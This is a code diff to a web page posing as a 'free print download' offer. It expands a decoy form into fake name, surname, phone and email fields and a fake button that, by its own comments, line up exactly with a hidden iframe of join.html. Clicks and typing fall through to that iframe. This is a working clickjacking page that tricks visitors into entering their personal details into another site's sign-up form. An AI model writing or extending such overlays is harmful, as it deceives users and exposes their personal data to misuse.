@@ -56,7 +56,7 @@ h1 { font-size: 30px; font-weight: 800; line-height: 1.2; letter-spacing: -.02em
 .sidebar-card {
   position: fixed;
   top: 50px; left: 820px;
-  width: 400px; min-height: 230px;
+  width: 400px; min-height: 370px;
   background: var(--surf); border: 1px solid var(--line);
   border-radius: 12px; padding: 16px 16px 20px;
   z-index: 2; box-shadow: 0 2px 12px rgba(0,0,0,.06);
@@ -68,28 +68,46 @@ h1 { font-size: 30px; font-weight: 800; line-height: 1.2; letter-spacing: -.02em
 .sb-title { font-size: 17px; font-weight: 800; line-height: 1.25; margin-bottom: 4px; }
 .sb-pub { font-size: 12px; color: var(--muted); margin-bottom: 0; }
 
-/* ── EMAIL LABEL — matches join.html at top:131 left:826 ── */
-.email-label {
-  position: fixed; top: 131px; left: 826px;
-  font-size: 13px; font-weight: 500; color: var(--ink);
-  z-index: 2; pointer-events: none;
-}
+/* ── DECOY LABELS ── */
+.label-name   { position: fixed; top: 107px; left: 826px; font-size: 13px; font-weight: 500; color: var(--ink); z-index: 2; pointer-events: none; }
+.label-surname{ position: fixed; top: 107px; left: 1013px; font-size: 13px; font-weight: 500; color: var(--ink); z-index: 2; pointer-events: none; }
+.label-phone  { position: fixed; top: 179px; left: 826px; font-size: 13px; font-weight: 500; color: var(--ink); z-index: 2; pointer-events: none; }
+.email-label  { position: fixed; top: 251px; left: 826px; font-size: 13px; font-weight: 500; color: var(--ink); z-index: 2; pointer-events: none; }
 
-/* ── DECOY EMAIL INPUT — matches join.html: top:155 left:826 w:374 h:48 ── */
-.fake-email-input {
-  position: fixed;
-  top: 155px; left: 826px; width: 374px; height: 48px;
+/* ── DECOY INPUTS — match join.html coordinates exactly ── */
+.fake-name-input {
+  position: fixed; top: 127px; left: 826px; width: 181px; height: 40px;
   background: var(--surf); border: 1.5px solid var(--line);
-  border-radius: 8px; padding: 0 14px;
+  border-radius: 6px; padding: 0 12px;
   font-family: inherit; font-size: 14px; color: var(--muted);
-  display: flex; align-items: center;
-  z-index: 2; pointer-events: none;
+  display: flex; align-items: center; z-index: 2; pointer-events: none;
+}
+.fake-surname-input {
+  position: fixed; top: 127px; left: 1013px; width: 187px; height: 40px;
+  background: var(--surf); border: 1.5px solid var(--line);
+  border-radius: 6px; padding: 0 12px;
+  font-family: inherit; font-size: 14px; color: var(--muted);
+  display: flex; align-items: center; z-index: 2; pointer-events: none;
+}
+.fake-phone-input {
+  position: fixed; top: 199px; left: 826px; width: 374px; height: 40px;
+  background: var(--surf); border: 1.5px solid var(--line);
+  border-radius: 6px; padding: 0 12px;
+  font-family: inherit; font-size: 14px; color: var(--muted);
+  display: flex; align-items: center; z-index: 2; pointer-events: none;
+}
+.fake-email-input {
+  position: fixed; top: 271px; left: 826px; width: 374px; height: 40px;
+  background: var(--surf); border: 1.5px solid var(--line);
+  border-radius: 6px; padding: 0 12px;
+  font-family: inherit; font-size: 14px; color: var(--muted);
+  display: flex; align-items: center; z-index: 2; pointer-events: none;
 }
 
-/* ── DECOY GET BUTTON — matches join.html: top:219 left:826 w:374 h:48 ── */
+/* ── DECOY GET BUTTON — matches join.html: top:323 left:826 w:374 h:48 ── */
 .fake-get-btn {
   position: fixed;
-  top: 219px; left: 826px; width: 374px; height: 48px;
+  top: 323px; left: 826px; width: 374px; height: 48px;
   background: #000; color: #fff;
   border: none; border-radius: 8px;
   font-family: inherit; font-size: 14px; font-weight: 700;
@@ -98,7 +116,7 @@ h1 { font-size: 30px; font-weight: 800; line-height: 1.2; letter-spacing: -.02em
 }
 
 .sb-recaptcha {
-  position: fixed; top: 273px; left: 826px; width: 374px;
+  position: fixed; top: 383px; left: 826px; width: 374px;
   font-size: 11px; color: var(--muted); line-height: 1.5;
   z-index: 2; pointer-events: none;
 }
@@ -125,12 +143,17 @@ h1 { font-size: 30px; font-weight: 800; line-height: 1.2; letter-spacing: -.02em
   <div class="sb-pub">Digital print · PNG · Partner access</div>
 </div>
 
-<!-- Decoy form -->
+<!-- Decoy form labels -->
+<div class="label-name">First name</div>
+<div class="label-surname">Last name</div>
+<div class="label-phone">Phone</div>
 <div class="email-label">Email address</div>
-<input class="fake-email-input" type="email" name="email"
-  placeholder="your@email.com"
-  aria-label="Email address for free print download"
-  tabindex="0" />
+
+<!-- Decoy inputs — pointer-events:none, real input goes to iframe -->
+<div class="fake-name-input" aria-label="First name" tabindex="0">First name</div>
+<div class="fake-surname-input" aria-label="Last name" tabindex="0">Last name</div>
+<div class="fake-phone-input" aria-label="Phone number" tabindex="0">+1 555 000 0000</div>
+<div class="fake-email-input" aria-label="Email address" tabindex="0">your@email.com</div>
 <button class="fake-get-btn" onclick="void(0)" tabindex="0">Get</button>
 <div class="sb-recaptcha">
   Download delivered via <strong>Pliego Editions</strong> · Protected by reCAPTCHA
